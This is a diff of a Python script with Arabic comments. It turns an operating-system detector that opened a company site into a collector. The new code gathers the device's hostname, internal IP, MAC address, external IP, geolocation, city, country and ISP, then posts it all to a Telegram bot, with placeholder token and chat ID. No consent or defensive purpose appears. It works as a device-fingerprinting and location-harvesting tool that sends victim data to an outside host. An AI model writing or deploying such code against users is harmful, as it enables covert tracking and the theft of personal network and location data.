@@ -1,115 +1,167 @@
+import platform
+import socket
+import requests
+import uuid
 import os
-import sys
-import subprocess
-import webbrowser
+from typing import Optional, Dict, Any
 
-def is_android():
-    """تحقق إذا كان النظام يعمل على أندرويد"""
-    android_indicators = [
-        "/system/build.prop",          # ملف خاص بأندرويد
-        "/system/bin/pm",              # أداة إدارة الحزم
-        "ANDROID_ROOT" in os.environ,  # متغير بيئة أندرويد
-        "ANDROID_DATA" in os.environ,
-        hasattr(sys, 'getandroidapilevel')  # في بعض بيئات بايثون لأندرويد
-    ]
-    return any(android_indicators)
-
-def get_android_version():
-    """الحصول على إصدار أندرويد بدون صلاحيات root"""
-    methods = [
-        lambda: subprocess.getoutput("getprop ro.build.version.release"),
-        lambda: read_android_file("/system/build.prop", "ro.build.version.release="),
-        lambda: os.environ.get("ANDROID_VERSION", "")
-    ]
-    
-    for method in methods:
-        try:
-            result = method().strip()
-            if result: return result
-        except:
-            continue
-    return "غير معروف"
-
-def read_android_file(file_path, key):
-    """قراءة ملف أندرويد للبحث عن معلومات محددة"""
-    try:
-        with open(file_path, 'r', encoding='latin-1') as f:
-            for line in f:
-                if line.startswith(key):
-                    return line.split("=")[1].strip()
-    except:
-        return ""
-
-def get_system_info():
-    """الحصول على معلومات النظام الأساسية"""
-    info = {
-        'system': os.name,
-        'platform': sys.platform,
-        'uname': os.uname() if hasattr(os, 'uname') else None
+def send_to_telegram(bot_token: str, chat_id: str, message: str):
+    """يرسل النتائج إلى بوت Telegram."""
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": message,
+        "parse_mode": "HTML"
     }
+    try:
+        response = requests.post(url, json=payload, timeout=10)
+        response.raise_for_status()
+        print("✓ تم إرسال النتائج إلى Telegram بنجاح")
+    except Exception as e:
+        print(f"✗ فشل الإرسال إلى Telegram: {e}")
+
+def get_linux_distro() -> Optional[str]:
+    """يحصل على اسم توزيعة Linux بدقة."""
+    try:
+        with open("/etc/os-release", encoding="utf-8") as file:
+            for line in file:
+                if "PRETTY_NAME" in line:
+                    return line.split("=")[1].strip().strip('"')
+    except FileNotFoundError:
+        pass
+
+    try:
+        with open("/etc/lsb-release", encoding="utf-8") as file:
+            for line in file:
+                if "DISTRIB_DESCRIPTION" in line:
+                    return line.split("=")[1].strip().strip('"')
+    except FileNotFoundError:
+        pass
+
+    return None
+
+def get_mac_address() -> str:
+    """يحصل على عنوان MAC بشكل دقيق."""
+    try:
+        if platform.system() == "Linux":
+            import fcntl
+            import struct
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', bytes("enp0s3", 'utf-8')[:15]))
+            return ':'.join(f'{b:02x}' for b in info[18:24])
+        else:
+            mac_num = uuid.getnode()
+            return ':'.join(['{:02x}'.format((mac_num >> i) & 0xff) for i in range(0, 8*6, 8)])
+    except Exception as e:
+        return f"غير متاح (خطأ: {str(e)})"
+
+def detect_os() -> Dict[str, Any]:
+    """يكتشف معلومات نظام التشغيل بدقة."""
+    system_name = platform.system()
+    version = platform.version()
+    release = platform.release()
+    architecture = platform.architecture()[0]
+    details = {
+        "نظام التشغيل": system_name,
+        "الإصدار": version,
+        "الإصدار التفصيلي": release,
+        "المعمارية": architecture,
+        "معلومات إضافية": {}
+    }
+
+    if system_name == "Windows":
+        win_ver = platform.win32_ver()
+        details["نظام التشغيل"] = f"Windows {win_ver[0]}"
+        details["معلومات إضافية"] = {
+            "حزمة الخدمة": win_ver[1],
+            "إصدار البناء": win_ver[2]
+        }
+    elif system_name == "Linux":
+        distro = get_linux_distro()
+        details["نظام التشغيل"] = distro if distro else "Linux (توزيعة غير معروفة)"
+        details["معلومات إضافية"] = {
+            "النواة": release
+        }
+    elif system_name == "Darwin":
+        mac_ver = platform.mac_ver()
+        details["نظام التشغيل"] = "iOS" if "iPhone" in os.uname().machine or "iPad" in os.uname().machine else "macOS"
+        details["الإصدار التفصيلي"] = mac_ver[0]
+    elif system_name == "Android":
+        details["نظام التشغيل"] = "Android"
+    else:
+        details["نظام التشغيل"] = f"{system_name} (غير معروف)"
+
+    return details
+
+def get_network_info() -> Dict[str, Any]:
+    """يجمع معلومات الشبكة والموقع."""
+    info = {
+        "الداخلية": {},
+        "الخارجية": {}
+    }
+
+    try:
+        hostname = socket.gethostname()
+        info["الداخلية"]["اسم الجهاز"] = hostname
+        info["الداخلية"]["IP الداخلي"] = socket.gethostbyname(hostname)
+        info["الداخلية"]["MAC"] = get_mac_address()
+    except Exception as e:
+        info["الداخلية"]["خطأ"] = f"فشل الحصول على المعلومات الداخلية: {str(e)}"
+
+    try:
+        response = requests.get("https://ipinfo.io/json", timeout=10)
+        data = response.json()
+        info["الخارجية"]["IP الخارجي"] = data.get("ip", "غير متاح")
+        info["الخارجية"]["موقع"] = data.get("loc", "غير متاح")
+        info["الخارجية"]["مدينة"] = data.get("city", "غير متاح")
+        info["الخارجية"]["منطقة"] = data.get("region", "غير متاح")
+        info["الخارجية"]["دولة"] = data.get("country", "غير متاح")
+        info["الخارجية"]["مزود الخدمة"] = data.get("org", "غير متاح")
+    except requests.exceptions.RequestException as e:
+        info["الخارجية"]["خطأ"] = f"فشل الحصول على المعلومات الخارجية: {str(e)}"
+
     return info
 
-def redirect_to_company_site(os_type):
-    """توجيه المستخدم إلى موقع الشركة حسب نظام التشغيل"""
-    company_sites = {
-        'android': 'https://www.google.com/',
-        'windows': 'https://www.example.com/windows',
-        'macos': 'https://www.example.com/macos',
-        'linux': 'https://www.example.com/linux',
-        'ios': 'https://www.example.com/ios',
-        'default': 'https://www.example.com'
-    }
+def format_results(os_info: Dict[str, Any], network_info: Dict[str, Any]) -> str:
+    """يقوم بتنسيق النتائج كرسالة HTML لإرسالها إلى Telegram."""
+    message = "<b>📊 معلومات النظام والشبكة</b>\n\n"
     
-    url = company_sites.get(os_type.lower(), company_sites['default'])
-    print(f"جاري توجيهك إلى موقع الشركة لنظام {os_type}...")
-    webbrowser.open(url)
+    message += "<b>💻 معلومات نظام التشغيل:</b>\n"
+    message += f"• <b>النظام:</b> {os_info['نظام التشغيل']}\n"
+    message += f"• <b>الإصدار:</b> {os_info['الإصدار']}\n"
+    message += f"• <b>التفاصيل:</b> {os_info['الإصدار التفصيلي']}\n"
+    message += f"• <b>المعمارية:</b> {os_info['المعمارية']}\n"
+    
+    for key, value in os_info['معلومات إضافية'].items():
+        message += f"• <b>{key}:</b> {value}\n"
 
-def detect_os():
-    print("=== نظام التشغيل الخاص بك ===")
+    message += "\n<b>🌐 معلومات الشبكة الداخلية:</b>\n"
+    for key, value in network_info['الداخلية'].items():
+        message += f"• <b>{key}:</b> {value}\n"
+
+    message += "\n<b>🌍 معلومات الشبكة الخارجية:</b>\n"
+    for key, value in network_info['الخارجية'].items():
+        message += f"• <b>{key}:</b> {value}\n"
+
+    return message
+
+def main():
+    """الدالة الرئيسية."""
+    # إعدادات بوت Telegram (يجب تغييرها)
+    BOT_TOKEN = "YOUR_BOT_TOKEN"
+    CHAT_ID = "YOUR_CHAT_ID"
     
-    system_info = get_system_info()
-    os_type = "غير معروف"
+    os_info = detect_os()
+    network_info = get_network_info()
     
-    if is_android():
-        version = get_android_version()
-        print("- نظام التشغيل: Android")
-        print(f"- الإصدار: {version}")
-        os_type = "android"
-        
-        if system_info['uname']:
-            print(f"- إصدار النواة: {system_info['uname'].release}")
-            print(f"- معمارية الجهاز: {system_info['uname'].machine}")
+    # عرض النتائج في الطرفية
+    print("\n" + "="*40)
+    print("جمع المعلومات بنجاح!")
+    print("="*40 + "\n")
     
-    elif system_info['platform'] == 'win32':
-        print("- نظام التشغيل: Windows")
-        print(f"- الإصدار: {sys.getwindowsversion().major}.{sys.getwindowsversion().minor}")
-        os_type = "windows"
-    
-    elif system_info['platform'] == 'darwin':
-        # التمييز بين macOS و iOS
-        if 'iPhone' in system_info['uname'].machine or 'iPad' in system_info['uname'].machine:
-            print("- نظام التشغيل: iOS")
-            os_type = "ios"
-        else:
-            print("- نظام التشغيل: macOS")
-            os_type = "macos"
-        
-        if system_info['uname']:
-            print(f"- إصدار النواة: {system_info['uname'].release}")
-    
-    elif system_info['platform'].startswith('linux'):
-        print("- نظام التشغيل: Linux")
-        os_type = "linux"
-        if system_info['uname']:
-            print(f"- إصدار النواة: {system_info['uname'].release}")
-            print(f"- معمارية الجهاز: {system_info['uname'].machine}")
-    
-    else:
-        print(f"- نظام غير معروف: {system_info['platform']}")
-    
-    print("=========================")
-    return os_type
+    # إرسال النتائج إلى Telegram
+    message = format_results(os_info, network_info)
+    send_to_telegram(BOT_TOKEN, CHAT_ID, message)
 
 if __name__ == "__main__":
-    detected_os = detect_os()
-    redirect_to_company_site(detected_os)
+    main()
